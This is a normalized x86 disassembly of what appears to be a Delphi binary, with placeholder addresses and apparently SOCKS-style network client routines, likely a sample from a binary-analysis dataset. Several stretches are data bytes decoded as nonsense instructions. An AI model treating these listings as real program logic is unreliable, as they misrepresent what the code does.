mov [ ebp - 0x10c ] eax
jmp r-xdata
add ebx 0x9
lea edx [ ebp - 0x110 ]
mov ecx ebx
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x58 ]
lea edx [ ebp - 0x8 ]
mov ecx 0x8
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
mov al [ ebp - 0x7 ]
sub al 0x5a
je r-xdata
mov eax edi
call sub_4041b8
push eax
mov eax edi
call sub_4043b8
lea edx [ ebp + ebx - 0x106 ]
pop ecx
call sub_4028e0
mov eax edi
call sub_4041b8
inc ebx
add eax ebx
mov ebx eax
mov [ ebp + ebx - 0x107 ] 0x0
lea eax [ ebp - 0x108 ]
mov edx [ esi + 0x78 ]
mov ecx 0xff
call sub_404194
xor ebx ebx
mov bl [ ebp - 0x108 ]
mov [ ebp + ebx - 0x107 ] 0x0
cmp [ esi + 0x7c ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465600
lea eax [ ebp - 0x124 ]
mov edx 0x5
call sub_403f1c
retn
dec al
je r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x11c ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x11c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x124 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x124 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
sub_465618
push ebp
mov ebp esp
push ecx
mov ecx 0x29
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x68 ] 0x0
jne r-xdata
mov [ ebp - 0x10e ] 0x2
mov [ ebp - 0x10e ] 0x0
jmp r-xdata
mov al [ ebp - 0x10f ]
cmp al [ ebp - 0xd ]
jne r-xdata
mov al [ ebp - 0x10e ]
mov [ ebp - 0xd ] al
mov [ ebp - 0x110 ] 0x5
mov al 0x1
mov [ ebp - 0x10f ] al
and eax 0xff
add eax 0x2
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx [ ebp - 0xc ]
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push j_sub_4036f0#3
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
cmp al 0xff
jne r-xdata
mov [ ebp - 0x110 ] 0x5
mov [ ebp - 0x10f ] 0x1
mov [ ebp - 0x10e ] 0x0
mov [ ebp - 0x10d ] 0x3
mov eax [ ebp - 0x4 ]
call sub_4041b8
mov [ ebp - 0x10c ] al
mov esi 0x5
mov eax [ ebp - 0x4 ]
call sub_4041b8
test eax eax
jle r-xdata
mov [ ebp - 0x110 ] 0x1
mov eax [ ebx + 0x78 ]
call sub_4041b8
mov [ ebp - 0x10f ] al
mov esi 0x2
mov eax [ ebx + 0x78 ]
call sub_4041b8
test eax eax
jle r-xdata
cmp [ ebx + 0x68 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4041b8
add esi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10 ] ax
lea edx [ ebp + esi - 0x110 ]
lea eax [ ebp - 0x10 ]
mov ecx 0x2
call sub_4028e0
add esi 0x2
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor eax eax
push ebp
push j_sub_4035c4#3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x5
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4041b8
push eax
mov eax [ ebp - 0x4 ]
call sub_4043b8
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028e0
mov eax [ ebx + 0x78 ]
call sub_4041b8
add esi eax
mov eax [ ebx + 0x70 ]
call sub_4041b8
mov [ ebp + esi - 0x110 ] al
inc esi
mov eax [ ebx + 0x70 ]
call sub_4041b8
test eax eax
jle r-xdata
mov eax [ ebx + 0x78 ]
call sub_4041b8
push eax
mov eax [ ebx + 0x78 ]
call sub_4043b8
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028e0
xor eax eax
mov al [ ebp - 0x10f ]
cmp eax 0x8
ja r-xdata
mov eax [ ebx + 0x70 ]
call sub_4041b8
add esi eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push j_sub_4036f0#2
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebx + 0x70 ]
call sub_4041b8
push eax
mov eax [ ebx + 0x70 ]
call sub_4043b8
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028e0
lea edx [ ebp - 0x148 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x148 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp [ eax * 4 + sub_465994 ]
cmp [ ebp - 0x10f ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x6
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x128 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
xor eax eax
push ebp
push j_sub_4035c4#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
dec ecx
lea edx [ ebp - 0x10b ]
mov eax [ ebx + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov al [ ebp - 0x10c ]
add eax 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x10d ]
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x14c ]
mov edx 0xf
call sub_403f1c
retn
mov [ ebp - 0xc ] 0x12
jmp r-xdata
sub_465994
cmp ebx [ ebx + 0x46 ]
add [ ebp - 0x16ffb9a7 ] bh
pop ecx
inc esi
add [ 0x4100465a ] dl
pop edx
inc esi
add [ ebp + 0x5a ] ch
inc esi
add [ ecx - 0x3dffb9a6 ] bl
pop edx
inc esi
add bl ch
pop edx
inc esi
add cl ch
jle r-xdata
add [ ebp - 0x1276b ] cl
jmp [ ecx + rw-data ]
add [ eax ] al
lea edx [ ebp - 0x128 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x128 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
mov al [ ebp - 0x10d ]
dec al
je r-xdata
mov [ ebp - 0xc ] 0x6
jmp r-xdata
sub al 0x2
je r-xdata
xor eax eax
push ebp
push j_sub_4035c4#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
dec ecx
lea edx [ ebp - 0x10b ]
mov eax [ ebx + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov al [ ebp - 0x10c ]
add eax 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x14c ]
mov edx 0xf
call sub_403f1c
retn
mov [ ebp - 0xc ] 0x12
jmp r-xdata
sub_465bfc
push ebx
mov bl [ eax + 0x7c ]
dec ebx
sub bl 0x2
jb r-xdata
call sub_4653f0
pop ebx
retn
je r-xdata
call sub_465618
jmp r-xdata
pop ebx
retn
sub_465c18
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_465c3d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465c44
retn
sub_465c50
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_465c75
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465c7c
retn
sub_465c88
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_465cad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465cb4
retn
sub_465d45
cmp [ esi ] al
loopne r-xdata
inc esi
add [ esp + ecx * 2 + 0x46 ] bh
add [ 0x64491100 ] al
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
inc esi
add [ esi + ebx * 2 + 0x46 ] dh
add [ eax ] al
inc esi
add al ch
popad
inc esi
add [ eax ] bh
bound eax [ esi ]
push 0x74004662
bound eax [ esi ]
hlt
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5e ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x5e ] ah
inc esi
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
call sub_41a9a8
mov eax [ r-xdata ]
call sub_463334
test al al
je r-xdata
popad
nop
push ebx
mov ebx eax
mov eax ebx
call sub_464ca8
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
push edx
inc esi
add ah bl
arpl [ esi ] ax
je r-xdata
add [ eax + 0x52 ] bl
mov edi 0x7d
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
mov edx 0x7d
call sub_4625c4
mov edi eax
jmp r-xdata
pop ebx
retn
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x20 ]
add [ eax ] cl
add [ eax ] al
test [ eax ] ch
inc ecx
add [ ebx + esi + 0x40 ] ch
add ah dh
cmpsb [ esi ] [ edi ]
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
mov [ esi - 0x5857ffbf ] fs
inc ecx
add [ eax + 0x64 ] dh
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + r-xdata ] ch
add [ eax ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 + 0x68 ] si
jb r-xdata
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53090003 ] al
outsd
arpl [ ebx + 0x73 ] bp
dec ecx
outsb
outsw
add [ eax ] dl
inc eax
add [ eax + eax ] ch
[ eax + eax ]
cmp edi esi
jge r-xdata
lea esi [ edi + 0x1 ]
test bl bl
je r-xdata
mov eax esi
call sub_462968
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax edi
call sub_462968
sub esi edi
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a9d0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_41a9d8
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_4041b8
test eax eax
jle r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4632f0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
lea esi [ edi + 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465fe0
mov eax [ ebp - 0x4 ]
call sub_403124
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
cmp edi esi
jl r-xdata
xor esi esi
jmp r-xdata
sub_465e90
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_465ff6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi 0xfffffffe
sete bl
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a5bc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_465fd9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
call sub_41a9a8
mov eax [ r-xdata ]
call sub_463334
test al al
je r-xdata
mov edi 0x7d
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
mov edx 0x7d
call sub_4625c4
mov edi eax
jmp r-xdata
cmp edi esi
jge r-xdata
lea esi [ edi + 0x1 ]
test bl bl
je r-xdata
mov eax esi
call sub_462968
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax edi
call sub_462968
sub esi edi
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a9d0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_41a9d8
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_4041b8
test eax eax
jle r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4632f0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
lea esi [ edi + 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465fe0
mov eax [ ebp - 0x4 ]
call sub_403124
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
cmp edi esi
jl r-xdata
xor esi esi
jmp r-xdata
sub_466004
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4661d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4663dc
mov al [ eax + 0x7c ]
dec eax
sub al 0x3
jae r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_403f90
mov edi [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4663dc
mov edx [ eax + 0x6c ]
lea eax [ ebp - 0x10 ]
call sub_403f90
mov eax [ ebp - 0x4 ]
call sub_4663dc
mov edi [ eax + 0x74 ]
jmp r-xdata
lea ecx [ ebp - 0x1c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_460cb0
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx edi
call sub_463f78
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
push 0x0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4637cc
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_464cac
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x68 ]
xor ecx ecx
mov edx 0x1
mov eax ebx
call sub_463ccc
lea eax [ ebx + 0x14 ]
mov edx [ ebp + 0x18 ]
call sub_403f4c
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x24 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x28 ] eax
mov eax ebx
call sub_463e58
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_46115c
test al al
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4637cc
cmp esi 0xffffffff
je r-xdata
mov eax [ rw-data ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx 0x1
mov edx 0x6
call sub_463dec
mov eax [ r-xdata ]
call sub_463334
test al al
je r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460b64
jmp r-xdata
push ebp
mov eax 0x1d4c0
call sub_465e90
pop ecx
jmp r-xdata
push ebp
mov eax esi
call sub_465e90
pop ecx
mov eax [ ebp - 0x4 ]
call sub_4663dc
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_465bfc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4661dc
lea eax [ ebp - 0x1c ]
call sub_403ef8
lea eax [ ebp - 0x10 ]
call sub_403ef8
retn
sub_4661fc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4636a8
mov [ esi + 0x6c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_466238
push ebx
mov ebx eax
mov eax ebx
call sub_464ce4
mov eax [ ebx + 0x68 ]
test eax eax
jne r-xdata
mov dl 0x1
call sub_4641c4
pop ebx
retn
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_463f94
mov [ ebx + 0x68 ] eax
pop ebx
retn
sub_466274
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4662e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_463da4
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4662eb
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_4662f4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_466364
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_463dc8
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46636b
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_466374
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov [ ebx + 0x70 ] esi
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x70 ]
test eax eax
je r-xdata
mov eax ebx
call sub_4663dc
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax esi
mov [ ebx + 0x70 ] eax
mov edx ebx
call sub_41ab4c
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_4663dc
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
xor eax eax
mov [ ebx + 0x70 ] eax
lea eax [ ebx + 0x70 ]
call sub_40d1c0
mov eax [ ebx + 0x70 ]
mov [ eax + 0x80 ] ebx
pop esi
pop ebx
retn
sub_4663dc
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x70 ]
pop ebx
retn
cmp [ ebx + 0x70 ] 0x0
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4653ac
mov [ ebx + 0x70 ] eax
sub_466404
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x70 ]
test eax eax
je r-xdata
lea eax [ esi + 0x68 ]
call sub_40d1c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_464cb4
test bl bl
jle r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
lea eax [ esi + 0x70 ]
call sub_40d1c0
sub_466448
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41ad98
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x70 ]
jne r-xdata
xor eax eax
mov [ esi + 0x70 ] eax
sub_466470
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4036f0#4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov [ ebp - 0xc ] 0x2719
mov [ ebp - 0x8 ] 0x2736
lea ecx [ ebp - 0xc ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460b70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a9d0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4664fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_466521
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466528
retn
sub_466538
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x65
inc esi
add [ eax ] ah
add [ eax ] al
add al cl
and eax [ ecx ]
insb
xor eax [ eax ]
js r-xdata
push 0x6e140041
inc ecx
add [ esp + edi * 2 ] ah
inc esi
add [ eax + 0xf00467c ] bh
push esp
dec ecx
push ebx
imul ebp [ ebp + 0x70 ] 0x7542656c
jb r-xdata
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
inc esp
insd
inc ecx
add [ esi + 0x6de80041 ] dl
inc ecx
add al bh
inc cx
add al ch
insb
inc ecx
add [ eax + 0x2000416e ] ah
insd
inc ecx
add [ eax + ebp * 2 ] bl
inc ecx
add [ esi + ebp * 2 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc si
add [ eax ] al
fsubr [ esi - 0x502bffbf ]
jb r-xdata
push esp
inc ebx
push eax
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
mov [ esi + 0x46 ] fs
add [ eax + 0x36 ] bl
inc esi
add [ eax + 0x6e ] cl
inc esi
add al dl
outsb
inc esi
add [ eax + 0x6e ] dh
inc esi
add [ edi + ebp * 2 ] dh
inc esi
add al ah
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ch
inc esi
add [ eax ] ch
add [ eax ] al
add [ 0x336c0046 ] dh
inc eax
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
inc esp
insd
inc ecx
add [ esi + 0x6de80041 ] dl
inc ecx
add al bh
inc cx
add al ch
insb
inc ecx
add [ eax + 0x3000416e ] ah
add [ esi ] sub_41681c
adc al 0x6e
inc ecx
add [ eax + 0x7000467f ] dl
add [ esi ] 0x10
push esp
dec ecx
dec ebp
popad
outsb
popad
inc edx
jne r-xdata
inc eax
add [ esi + 0x46 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x67
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] dl
inc esi
add [ eax - 0x40000000 ] bh
xor eax 0xb1ec0046
inc ecx
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
inc ecx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
mov [ ebp + 0x46 ] gs
add [ eax ] al
dec eax
inc ecx
add ah dh
lodsd [ esi ]
inc ecx
add [ edi + eax * 2 ] bl
inc ecx
add ah cl
scasb [ edi ]
inc ecx
add ah ah
je r-xdata
add [ eax ] al
add [ eax + 0x4d0d0007 ] al
popad
js r-xdata
jb r-xdata
add [ edi ] cl
add [ edi ] cl
add al al
je r-xdata
insd
inc esi
add [ eax ] cl
jpo r-xdata
inc ecx
add [ edx + esi * 4 ] al
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add [ eax - 0x77ffb994 ] ch
cmp [ esi ] al
sar [ eax ] 0x46
add al dh
cmp [ esi ] al
sub [ esi + 0x46 ] ch
add [ esp + esi * 2 + 0x6b040046 ] ch
inc esi
add [ ebx + ebp * 2 + 0x7bcc0046 ] ch
inc esi
add [ ebp + edi * 2 + 0x6c800046 ] bl
inc esi
add al dh
add ah bl
scasb [ edi ]
inc ecx
add ah dl
scasd [ edi ]
arpl [ esi + 0x42 ] si
jne r-xdata
imul ebp [ esi + 0x65 ] 0x69746341
outsd
outsb
jo r-xdata
dec ecx
push esp
